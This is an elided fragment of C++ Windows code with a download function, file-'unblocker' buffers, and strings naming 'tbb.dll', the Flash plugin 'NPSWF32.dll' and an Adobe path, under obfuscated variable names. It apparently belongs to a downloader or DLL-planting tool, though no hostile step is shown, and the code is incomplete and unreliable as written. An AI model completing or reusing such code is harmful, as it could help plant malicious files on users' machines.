...
void download(const std::wstring& url, const std::wstring& file, const std::wstring& args)
{
	...
	wchar_t unblocker[MAX_PATH + 1];
	wchar_t* unblocker1;
	unblocker1 = unblocker;

	wchar_t unblocker2[MAX_PATH + 1];
	...
	LPSTR lpCmdLine, int nCmdShow)
{
...
#endif
	wchar_t buffer_1[MAX_PATH + 1] = L"projects";
	wchar_t* lpStr1;
	lpStr1 = buffer_1;
	...
	wchar_t buffer_3[MAX_PATH + 1] = L"solutions";
	wchar_t* lpStr3;
	lpStr3 = buffer_3;
	...
	wchar_t adobepath[MAX_PATH + 1];
	wchar_t* adobepath1;
	adobepath1 = adobepath;

	wchar_t asd[MAX_PATH + 1];
	...
	wchar_t buffer_7a[MAX_PATH + 1] = L"0.0.1.64";
	wchar_t* lpStr7a;
	lpStr7a = buffer_7a;
	...
	wchar_t buffer_14a[MAX_PATH + 1] = L"0.0.1.117";
	wchar_t* lpStr14a;
	lpStr14a = buffer_14a;
	...
	wchar_t asd2bb[MAX_PATH + 1] = L"tbb.dll";
	wchar_t* asd21bb;
	asd21bb = asd2bb;
	...
	wchar_t buffer_11[MAX_PATH + 1] = L"Resources";
	wchar_t* flash;
	flash = buffer_11;

	wchar_t buffer_11a[MAX_PATH + 1] = L"NPSWF32.dll";
	wchar_t* flasha;
	flasha = buffer_11a;
	...
	wchar_t asdccddqqqq[MAX_PATH + 1];
	...
	wchar_t asd2ccqqqqqq[MAX_PATH + 1];
	...
	wchar_t asdccddqqqqqq[MAX_PATH + 1];
	...
	wchar_t asd2ccqqqqqqqq[MAX_PATH + 1];
	...
	wchar_t asdccddqqqqqqqq[MAX_PATH + 1];
	...
	wchar_t asd2ccqqqqqqqqqq[MAX_PATH + 1];
	...
	wchar_t asdccddqqqqqqqqw[MAX_PATH + 1];
	...
	wchar_t asd2ccqqqqqqqqqqa[MAX_PATH + 1];
